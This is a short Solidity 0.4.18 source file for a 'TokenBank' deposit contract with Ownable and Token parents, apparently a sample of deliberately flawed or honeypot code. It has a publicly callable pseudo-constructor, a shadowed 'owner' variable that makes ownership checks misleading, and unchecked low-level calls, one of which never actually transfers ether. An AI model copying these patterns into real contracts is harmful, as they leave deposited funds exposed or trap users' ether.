1 pragma solidity ^0.4.18;
2 
3 contract Ownable
4 {
5     address newOwner;
6     address owner = msg.sender;
7     
8     function changeOwner(address addr)
9     public
10     onlyOwner
11     {
12         newOwner = addr;
13     }
14     
15     function confirmOwner() 
16     public
17     {
18         if(msg.sender==newOwner)
19         {
20             owner=newOwner;
21         }
22     }
23     
24     modifier onlyOwner
25     {
26         if(owner == msg.sender)_;
27     }
28 }
29 
30 contract Token is Ownable
31 {
32     address owner = msg.sender;
33     function WithdrawToken(address token, uint256 amount,address to)
34     public 
35     onlyOwner
36     {
37         token.call(bytes4(sha3("transfer(address,uint256)")),to,amount); 
38     }
39 }
40 
41 contract TokenBank is Token
42 {
43     uint public MinDeposit;
44     mapping (address => uint) public Holders;
45     
46      ///Constructor
47     function initTokenBank()
48     public
49     {
50         owner = msg.sender;
51         MinDeposit = 1 ether;
52     }
53     
54     function()
55     payable
56     {
57         Deposit();
58     }
59    
60     function Deposit() 
61     payable
62     {
63         if(msg.value>MinDeposit)
64         {
65             Holders[msg.sender]+=msg.value;
66         }
67     }
68     
69     function WitdrawTokenToHolder(address _to,address _token,uint _amount)
70     public
71     onlyOwner
72     {
73         if(Holders[_to]>0)
74         {
75             Holders[_to]=0;
76             WithdrawToken(_token,_amount,_to);     
77         }
78     }
79    
80     function WithdrawToHolder(address _addr, uint _wei) 
81     public
82     onlyOwner
83     payable
84     {
85         if(Holders[msg.sender]>0)
86         {
87             if(Holders[_addr]>=_wei)
88             {
89                 _addr.call.value(_wei);
90                 Holders[_addr]-=_wei;
91             }
92         }
93     }
94     
95     function Bal() public constant returns(uint){return this.balance;}
96 }